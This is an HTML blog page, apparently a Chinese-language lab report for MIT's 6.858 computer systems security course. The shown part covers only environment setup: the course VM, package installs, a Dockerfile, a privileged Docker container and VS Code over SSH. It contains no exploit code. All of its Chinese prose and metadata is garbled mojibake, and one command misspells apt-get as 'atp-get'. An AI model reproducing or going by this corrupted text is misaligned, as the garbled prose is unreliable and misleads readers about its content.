

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="æ„Ÿè§‰ä¸å¦‚ CTF 7 å¤©é€Ÿæˆè¯¾ç¨‹â€¦ç”»è´¨â€¦">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š">
<meta property="og:url" content="https://arttnba3.github.io/2022/12/25/EXPR-0X01-MIT_6_858/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="æ„Ÿè§‰ä¸å¦‚ CTF 7 å¤©é€Ÿæˆè¯¾ç¨‹â€¦ç”»è´¨â€¦">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/02/21/UwuF2BlSxKCRAyH.png">
<meta property="article:published_time" content="2022-12-24T15:15:28.000Z">
<meta property="article:modified_time" content="2023-08-13T08:31:06.000Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="ä¿¡æ¯å®‰å…¨">
<meta property="article:tag" content="ç¬¦å·æ‰§è¡Œ">
<meta property="article:tag" content="ret2libc">
<meta property="article:tag" content="æ ˆæº¢å‡º">
<meta property="article:tag" content="ret2shellcode">
<meta property="article:tag" content="å®éªŒç¬”è®°">
<meta property="article:tag" content="MIT">
<meta property="article:tag" content="Concolic Execution">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.loli.net/2022/02/21/UwuF2BlSxKCRAyH.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"arttnba3.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"Â§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                å‹é“¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" target="_blank" rel="noopener" href="https://github.com/arttnba3">
                <i class="iconfont icon-github-fill"></i>
                GitHub
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://s2.loli.net/2022/11/29/KUG3v2uoqjm9nZg.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-12-25 02:15" pubdate>
          2022å¹´12æœˆ25æ—¥ å‡Œæ™¨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          79k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          658 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2023å¹´8æœˆ13æ—¥ æ™šä¸Š
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>æ„Ÿè§‰ä¸å¦‚ CTF 7 å¤©é€Ÿæˆè¯¾ç¨‹â€¦ç”»è´¨â€¦</p>
<span id="more"></span>

<h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a target="_blank" rel="noopener" href="http://css.csail.mit.edu/6.858/2022/">MIT 6.858</a> æ˜¯é¢å‘é«˜å¹´çº§æœ¬ç§‘ç”Ÿä¸ç ”ç©¶ç”Ÿå¼€è®¾çš„ä¸€é—¨å…³äº<strong>è®¡ç®—æœºç³»ç»Ÿå®‰å…¨</strong>ï¼ˆsecure computer securityï¼‰çš„è¯¾ç¨‹ï¼Œå†…å®¹åŒ…æ‹¬å¨èƒæ¨¡å‹ï¼ˆthreat modelsï¼‰ã€å±å®³å®‰å…¨çš„æ”»å‡»ï¼ˆattacks that compromise securityï¼‰ã€å®ç°å®‰å…¨çš„æŠ€æœ¯ï¼ˆtechniques for achieving securityï¼‰</p>
<p>åœ¨ YouTube ä¸Šæœ‰<a target="_blank" rel="noopener" href="https://www.youtube.com/playlist?list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">å¾€å¹´çš„è¯¾ç¨‹å›æ”¾</a>ï¼Œé…æœ‰è‹±æ–‡å­—å¹•ï¼Œä¸è¿‡ä½œä¸ºä¸€ä¸ªå¹¶éæ˜¯å¯¹å®‰å…¨ä¸€æ— æ‰€çŸ¥çš„å®‰å…¨å°ç™½ï¼Œç¬”è€…ä¸»è¦è¿˜æ˜¯æŒ‘è‡ªå·±ä¸ç†Ÿæ‚‰çš„é‚£ä¸€å—è·³ç€å¬ï¼ˆç¬‘ï¼‰</p>
<p>è¿™ä¸ªè¯¾ç¨‹ä¸€å…±æœ‰äº”ä¸ª Labï¼š</p>
<ul>
<li>Lab1ï¼šç¼“å†²åŒºæº¢å‡ºï¼ˆbuffer overflowï¼‰</li>
<li>Lab2ï¼šæƒé™åˆ†ç¦»ä¸æœåŠ¡ä¾§æ²™ç®±ï¼ˆprivilege separation and server-side sandboxingï¼‰</li>
<li>Lab3ï¼šç¬¦å·æ‰§è¡Œï¼ˆsymbolic executionï¼‰</li>
<li>Lab4ï¼šæµè§ˆå™¨å®‰å…¨ï¼ˆbrowser securityï¼‰</li>
<li>Lab5ï¼šå®‰å…¨çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆsecure file systemï¼‰</li>
</ul>
<p>å‰å››ä¸ª Lab ä¸»è¦æ˜¯åŸºäº MIT å¼€å‘çš„ä¸€ä¸ªå« <code>zookws</code> çš„ web server å®Œæˆçš„</p>
<h2 id="PRE-ç¯å¢ƒæ­å»º-è¯´æ˜"><a href="#PRE-ç¯å¢ƒæ­å»º-è¯´æ˜" class="headerlink" title="PRE. ç¯å¢ƒæ­å»º &amp;&amp; è¯´æ˜"></a>PRE. ç¯å¢ƒæ­å»º &amp;&amp; è¯´æ˜</h2><p>è¿™é‡Œç»™å‡ºä¸‰ç§æ­å»ºå®éªŒç¯å¢ƒçš„æ–¹å¼</p>
<h3 id="Method-I-ï¼ˆæ¨èï¼‰ä½¿ç”¨-MIT-æä¾›çš„-VM-é•œåƒ"><a href="#Method-I-ï¼ˆæ¨èï¼‰ä½¿ç”¨-MIT-æä¾›çš„-VM-é•œåƒ" class="headerlink" title="Method I.ï¼ˆæ¨èï¼‰ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒ"></a>Method I.ï¼ˆæ¨èï¼‰ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒ</h3><blockquote>
<p>å‚è§ <a target="_blank" rel="noopener" href="http://css.csail.mit.edu/6.858/2022/labs/lab1.html">Lab 1</a></p>
</blockquote>
<p>MIT æä¾›äº†ä¸€ä¸ª  <a target="_blank" rel="noopener" href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">course VM image</a> ï¼Œå…¶ä¸­æœ‰ç€ä¸€ä¸ª Ubuntu 21.10 çš„ç³»ç»Ÿï¼Œç™»å½•çš„ç”¨æˆ·åä¸º <code>student</code>ï¼Œå¯†ç ä¸º <code>6858</code>ï¼Œä¸‹è½½è§£å‹åæ ¹æ®è‡ªèº«çš„æœ¬åœ°ç¯å¢ƒè¿›è¡Œå¯¹åº”çš„æ“ä½œï¼š</p>
<ul>
<li>ä½¿ç”¨ KVM è¿è¡Œï¼šç›´æ¥è¿è¡Œ <strong><code>./6.858-x86_64-v22.sh</code></strong> å³å¯</li>
<li>ä½¿ç”¨ VMwareè¿è¡Œï¼šæ–°å»ºè™šæ‹Ÿæœºâ†’ç¨åå®‰è£…æ“ä½œç³»ç»Ÿâ†’é€‰æ‹©ç³»ç»Ÿ <code>Linux &gt; Debian 9.x 64-bit</code> â†’ç§»é™¤åŸæœ‰è™šæ‹Ÿç£ç›˜â†’æ·»åŠ æ–°çš„è™šæ‹Ÿç£ç›˜â†’é€‰æ‹©  <code>6.858-x86_64-v22.vmdk</code> å³å¯</li>
</ul>
<p>å¯¹äºé X86 æ¶æ„çš„å¤„ç†å™¨ç¯å¢ƒï¼Œ<del>ğŸ‘´çš„å»ºè®®æ˜¯åˆ«åšäº†</del>ï¼Œåœ¨å®éªŒæ‰‹å†Œé‡Œæ¨èå®‰è£… qemu ï¼Œç¬”è€…å°±ä¸æ‘˜æŠ„ä¸€éäº†</p>
<p><img src="https://s2.loli.net/2022/12/07/bjhUwo5k9q8EiTJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å½“ç„¶æ²¡æœ‰å›¾å½¢ç•Œé¢åªæœ‰ä¸€ä¸ª tty æ¯”è¾ƒéš¾å—ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯æ¨èç”¨ ssh è¿ä¸Šå»åšï¼Œå› ä¸ºè™šæ‹Ÿæœºåœ¨æœ¬åœ°æ‰€ä»¥ç›´æ¥ <code>ip addr show dev eth0</code> æ‰¾åˆ° IP å <code>ssh student@YOUR_IP</code> å°±è¡Œï¼š</p>
<p><img src="https://s2.loli.net/2022/12/07/MJcV1zZdS5NvnjE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä¹‹åè¿˜æ˜¯æŒ‰æƒ¯ä¾‹æŠŠä»£ç æ‹‰åˆ°æœ¬åœ°ï¼Œå¹¶ä½¿ç”¨ <code>make</code> æ„å»ºä¸€ä¸‹ <code>zookws</code> çœ‹æœ‰æ²¡æœ‰å•¥é—®é¢˜ï¼Œæ²¡æŠ¥é”™å°±ğŸ†—ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>zookd</code> è´Ÿè´£æ¥æ”¶ HTTP è¯·æ±‚ï¼Œå…¶ç”± C ç¼–å†™ï¼ŒHTTP ç›¸å…³çš„ä»£ç ä½äº <code>http.c</code> ä¸­ï¼ŒHTTP åè®®ç›¸å…³èµ„æ–™<a target="_blank" rel="noopener" href="https://www.garshol.priv.no/download/text/http-tut.html">è§æ­¤å¤„</a></p>
<p>zookd æœ‰ä¸¤ç§ç‰ˆæœ¬ï¼š</p>
<ul>
<li><code>zookd-exstack</code>ï¼šæ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™</li>
<li><code>zookd-nxstack</code>ï¼šæ ˆä¸å…·æœ‰å¯æ‰§è¡Œæƒé™</li>
</ul>
<p>ç”¨ä»¥è¿›è¡Œè¯„åˆ†çš„ <code>zookd</code> ä½äº <code>bin.tar.gz</code> ä¸­</p>
<p>æ­¤å¤–ï¼ŒMIT è¿˜æä¾›äº†ä¸€ä¸ªç”¨ä»¥æ¸…ç†ç¯å¢ƒçš„ <code>clean-env.sh</code> è„šæœ¬ï¼Œç”¨ä»¥ç¡®ä¿æ¯æ¬¡çš„æ‰§è¡Œç¯å¢ƒéƒ½æ˜¯ç›¸åŒçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿è¡Œ zookdï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd 8080</span><br></code></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½åœ¨æœ¬åœ°çš„ 8080 ç«¯å£è®¿é—®åˆ° zookdï¼Œç›´æ¥è¿›å»å¤§æ¦‚ä¼šæ˜¯è¿™ä¸ªæ ·å­ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/29/KUG3v2uoqjm9nZg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="Method-II-è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ"><a href="#Method-II-è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ" class="headerlink" title="Method II. è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ"></a>Method II. è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ</h3><p>é¦–å…ˆæ˜¯é…ç¯å¢ƒï¼Œé™¤äº† <code>pwntools</code> æ˜¯ç¬”è€…ä¸ªäººæ¯”è¾ƒå–œæ¬¢çš„ä¸€ä¸ªç¼–å†™ exp çš„æ¨¡å—ä»¥å¤–å…¶ä»–éƒ½æ˜¯å®éªŒç¯å¢ƒå¿…é¡»çš„ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo atp-get install -y curl strace lxc-dev</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br></code></pre></td></tr></table></figure>

<p>ä¹‹åè¿˜æ˜¯æŒ‰æƒ¯ä¾‹æŠŠä»£ç æ‹‰åˆ°æœ¬åœ°ï¼Œå¹¶ä½¿ç”¨ <code>make</code> æ„å»ºä¸€ä¸‹ <code>zookws</code> çœ‹æœ‰æ²¡æœ‰å•¥é—®é¢˜ï¼Œæ²¡æŠ¥é”™å°±ğŸ†—ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure>

<h3 id="Method-III-ä½¿ç”¨-docker-æ­å»ºå®éªŒç¯å¢ƒ"><a href="#Method-III-ä½¿ç”¨-docker-æ­å»ºå®éªŒç¯å¢ƒ" class="headerlink" title="Method III.ä½¿ç”¨ docker æ­å»ºå®éªŒç¯å¢ƒ"></a>Method III.ä½¿ç”¨ docker æ­å»ºå®éªŒç¯å¢ƒ</h3><p>å› ä¸ºè¯„æµ‹ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶éœ€è¦ç”¨è¾ƒé«˜ç‰ˆæœ¬çš„ libcï¼ˆä¾‹å¦‚ç¬”è€…ç”¨çš„å°±æ˜¯ Ubuntu 20.04 with è¿‡æ—¶çš„ libc2.31ï¼‰ï¼ŒåŒæ—¶ä¹Ÿé¿å…æ±¡æŸ“æœ¬åœ°ç¯å¢ƒï¼Œå› æ­¤ä½¿ç”¨ Docker æ¥å®Œæˆå®éªŒä¹Ÿæ˜¯ä¸€ä¸ªéœ€æ±‚é¡¹</p>
<blockquote>
<p>Dockerfileï¼Œæ³¨æ„æ›¿æ¢ä¸Šè‡ªå·±çš„å…¬é’¥ï¼Œå¦‚æœæ²¡æœ‰ä»å¤–éƒ¨è¿æ¥å®¹å™¨çš„éœ€æ±‚çš„è¯è¿™ä¸€æ­¥å¯ä»¥è·³è¿‡</p>
</blockquote>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-comment"># basic environment</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive \</span><br><span class="language-bash">    apt-get install -y git python3-pip tmux vim curl openssh-server strace gdb lxc lxc-dev</span><br><br><span class="hljs-comment"># sqlalchemy for lab, pwntools for my own</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 config <span class="hljs-built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br><br><span class="hljs-comment"># pwndbg for a better debug experience</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /root &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> /root/pwndbg &amp;&amp; \</span><br><span class="language-bash">    ./setup.sh</span><br><br><span class="hljs-comment"># I&#x27;d like to make a new user for it</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m student</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> usermod -s /bin/bash student</span><br><br><span class="hljs-comment"># clone the lab</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /home/student &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> -R student:student ./lab</span><br><br><span class="hljs-comment"># make your ssh key authorized</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/student/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;è¿™é‡Œå†™ä½ çš„sshå…¬é’¥&quot;</span> &gt; /home/student/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># start ssh service and keep container running continuously</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\nservice ssh start\nsleep infinity&quot;</span> &gt; /root/start.sh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure>

<p>å› ä¸ºå®éªŒè¦å…³ ASLR æ‰€ä»¥æˆ‘ä»¬åœ¨å¯åŠ¨ docker æ—¶éœ€è¦ <code>--privileged</code>ï¼Œä¸è¿‡å› ä¸ºåªæ˜¯å®éªŒç”¨çš„å®¹å™¨æ‰€ä»¥æ— æ‰€è°“ï¼ŒåŒæ—¶ä¸ºäº†å¤–ç½‘èƒ½è®¿é—®åˆ°æ‰€ä»¥è¿™é‡Œé…äº†å‡ ä¸ªç«¯å£è½¬å‘ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker build -t <span class="hljs-string">&quot;mit_6858_img&quot;</span> .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run -d --privileged -p <span class="hljs-string">&quot;8080:8080&quot;</span> -p <span class="hljs-string">&quot;2022:22&quot;</span> -h <span class="hljs-string">&quot;mit_6858_docker&quot;</span> --name=<span class="hljs-string">&quot;mit_6858&quot;</span> mit_6858_img</span><br></code></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½ç›´æ¥è¿›åˆ°å®¹å™¨å†…éƒ¨ç»§ç»­å®éªŒï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker <span class="hljs-built_in">exec</span> -it mit_6858 /bin/bash</span><br></code></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥é€šè¿‡ ssh è¿›è¡Œè¿œç¨‹è¿æ¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh student@your_server_ip -p 2022</span><br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/12/03/RqEPmQyLzUskg4e.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="EXTRA-vscode-è¿æ¥"><a href="#EXTRA-vscode-è¿æ¥" class="headerlink" title="EXTRA.vscode è¿æ¥"></a>EXTRA.vscode è¿æ¥</h3><p>å› ä¸ºæˆ‘ä»¬çš„å®éªŒç¯å¢ƒéƒ½æœ‰ sshï¼Œæ‰€ä»¥ç›´æ¥ç”¨ vscode é€šè¿‡ ssh è¿æ¥æ˜¯éå¸¸æ–¹ä¾¿çš„ä¸€ä»¶äº‹æƒ…ï¼ˆå®¹å™¨é…ä¸Šç«¯å£è½¬å‘ä¹Ÿå¯ä»¥è¿æ¥ï¼‰</p>
<p> é¦–å…ˆåœ¨æ‰©å±•é‡Œæ‰¾åˆ° ssh æ’ä»¶å¹¶å®‰è£…</p>
<p><img src="https://s2.loli.net/2022/12/03/VlTkD8N5BPFUq7v.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ·»åŠ  host ä¿¡æ¯</p>
<p><img src="https://s2.loli.net/2022/12/03/U4ORh8JaWXulVB2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä¹‹åç›´æ¥è¿æ¥ä¸Šå»å°±è¡Œäº†</p>
<p><img src="https://s2.loli.net/2022/12/03/vNnUWPgELZIByY4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
